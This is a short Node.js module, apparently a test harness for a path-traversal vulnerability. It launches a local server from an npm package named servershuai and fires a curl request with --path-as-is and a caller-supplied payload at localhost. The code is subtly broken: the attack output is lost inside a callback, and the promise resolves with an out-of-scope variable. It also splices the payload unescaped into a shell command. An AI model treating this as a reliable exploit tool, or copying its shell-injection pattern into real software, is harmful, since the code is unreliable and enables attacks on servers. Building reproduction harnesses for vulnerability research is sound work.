const path = require("path");
const { sleep } = require("sleep");
const { exec } = require("child_process");

function exploitFunction(payload) {
    let server = "node ./node_modules/servershuai/index.js";

    let exe = exec(server, (error, stdout) => {
        if (error) {
            console.error(`Error starting server: ${error}`);
            return;
        }
        sleep.sleep(2);

        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
        exec(attack_string, (error, stdout) => {
            if (error) {
                console.error(`Error executing attack: ${error}`);
                return;
            }
            return stdout;
        });
    });

    return new Promise((resolve, reject) => {
        exe.on('close', (code) => {
            if (code !== 0) {
                reject(new Error(`Server exited with code ${code}`));
            } else {
                resolve(stdout);
            }
        });
    });
}

module.exports = { exploitFunction };